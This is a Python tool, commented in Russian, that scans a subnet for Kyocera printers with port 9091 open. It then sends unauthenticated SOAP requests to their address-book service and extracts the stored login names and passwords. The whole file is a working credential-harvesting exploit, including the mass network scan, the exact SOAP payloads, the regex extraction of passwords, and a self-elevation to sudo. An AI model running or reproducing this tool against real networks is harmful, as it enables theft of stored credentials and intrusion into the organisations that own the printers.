import argparse  # Для работы с аргументами командной строки
import socket  # Для работы с сетевыми операциями
import re  # Для работы с регулярными выражениями
import os  # Для взаимодействия с операционной системой
import sys  # Для доступа к системным параметрам и функциям
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

from scapy.all import ARP, Ether, srp, conf  # Для работы с сетевыми пакетами
import requests  # Для работы с HTTP-запросами
from lxml import etree  # Для работы с XML

from tabulate import tabulate  # Для вывода в таблицы
from colorama import Fore, Style  # Для цветов в консоли

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Kyocera:
    def __init__(self):
        """
        Задаем начальные параметры
        """
        self.interface = None
        self.subnet = None
        self.alive_ips = None
        self.valid_ips = []

        self.address_book_url = '/ws/km-wsdl/setting/address_book'
        self.headers = {
            "user-agent":
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; "
                "..NET CLR 1.1.4322; InfoPath.1; "
                ".NET CLR 2.0.50727)",
            "accept": "en-us",
            "content-type": "application/soap+xml"
        }
        self.regex_pattern_result = r'<kmaddrbook:login_name>[^\<]*</kmaddrbook:login_name><kmaddrbook:login_password>[^\<]*</kmaddrbook:login_password>'
        self.regex_pattern_credentials = r'<kmaddrbook:login_name>([^\<]*)</kmaddrbook:login_name><kmaddrbook:login_password>([^\<]*)</kmaddrbook:login_password>'
        self.enumeration_request = ''
        self.body_create = f'<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>'
        self.body_get = f'<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>{self.enumeration_request}</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>'

    @staticmethod
    def check_root_permissions():
        """
        Checks if the current user is root or not.
        """
        if os.geteuid() != 0:
            os.execvp('sudo', ['sudo', 'python3'] + sys.argv)

    def argument_parser(self):
        """
        Парсер аргументов командной строки
        """
        parser = argparse.ArgumentParser(
            prog='Extract Kyocera address book credentials')
        parser.add_argument('-i', '--interface', required=True, help='Сетевой интерфейс')
        parser.add_argument('-s', '--subnet', required=True, help='Подсеть или одиночный IP для сканирования')
        args = parser.parse_args()
        self.interface = args.interface
        self.subnet = args.subnet

        # Вывод исходных данных в виде таблицы
        table_data = [
            [f"{Fore.YELLOW}Интерфейс{Style.RESET_ALL}", self.interface],
            [f"{Fore.YELLOW}Подсеть{Style.RESET_ALL}", self.subnet]
        ]

        # Вывод таблицы
        print(tabulate(table_data,
                       headers=[f"{Fore.MAGENTA}Параметр{Style.RESET_ALL}", f"{Fore.MAGENTA}Значение{Style.RESET_ALL}"],
                       tablefmt="fancy_grid"))

    def scan_network(self):
        """
        Сканирует диапазон IP на наличие открытого порта.
        """
        ip_network = ipaddress.ip_network(self.subnet)
        ip_range = [str(ip) for ip in ip_network.hosts()]
        num_ips = len(ip_range)

        # Определяем количество рабочих потоков
        max_workers = min(1000, num_ips)

        results = []
        total_ips = len(ip_range)

        # Разбиваем IP-адреса на батчи по max_workers
        for i in range(0, total_ips, max_workers):
            batch = ip_range[i:i + max_workers]
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(self.is_port_open, ip): ip for ip in batch}
                for future in as_completed(futures):
                    ip, is_open = future.result()
                    if is_open:
                        self.valid_ips.append(ip)
                        print(f"Порт 9091 на {ip} открыт.")

        return results

    @staticmethod
    def is_port_open(ip, timeout=1):
        """
        Проверяет, открыт ли определенный порт на заданном IP-адресе.
        """
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, 9091))
            return ip, result == 0

    @staticmethod
    def check_http_title(ip):
        """
        Сканирование открытого порта 80 для http и поиск заданного заголовка
        """
        try:
            url = f"http://{ip}:80"
            response = requests.get(url, timeout=0.1)
            if 'kyocera' in response.text.lower():
                return True
        except requests.RequestException:
            pass
        return False

    def get_address_book(self, ip):
        """
        Выгрузка аутентификационных данных из адресной книги
        """
        response_create = requests.post(f'https://{ip}:9091{self.address_book_url}',
                                        data=self.body_create, headers=self.headers, verify=False)

        text = response_create.content.decode("utf-8")
        root = etree.fromstring(text)
        for appt in root.getchildren():
            for elem in appt.getchildren():
                if 'create_personal_address_enumerationResponse' in elem.tag:
                    for item in elem.getchildren():
                        if 'enumeration' in item.tag:
                            self.enumeration_request = item.text

        body = f'<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>{self.enumeration_request}</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>'

        response_get = requests.post(f'https://{ip}:9091{self.address_book_url}',
                                     data=body, headers=self.headers, verify=False)

        address_book = response_get.content.decode("utf-8")

        result = re.findall(self.regex_pattern_result, address_book)
        credentials = []
        for item in result:
            creds = re.search(self.regex_pattern_credentials, item)
            credentials.append([f'{Fore.YELLOW}{ip}{Style.RESET_ALL}', f'{Fore.YELLOW}{str(creds.group(1))}{Style.RESET_ALL}', f'{Fore.YELLOW}{str(creds.group(2))}{Style.RESET_ALL}'])

        # Выводим таблицу с результатами
        print(tabulate(credentials, headers=[f"{Fore.MAGENTA}IP{Style.RESET_ALL}", f"{Fore.MAGENTA}Логин{Style.RESET_ALL}", f"{Fore.MAGENTA}Пароль{Style.RESET_ALL}"], tablefmt="fancy_grid"))


if __name__ == '__main__':
    suzu_kyocera = Kyocera()

    # Проверка прав пользователя
    suzu_kyocera.check_root_permissions()

    # Чтение аргументов командной строки
    suzu_kyocera.argument_parser()

    # Сканирование сети на наличие открытых портов Kyocera
    suzu_kyocera.scan_network()

    # Получение аутентификационных данных для валидных IP-адресов
    for ip in suzu_kyocera.valid_ips:
        suzu_kyocera.get_address_book(ip=ip)

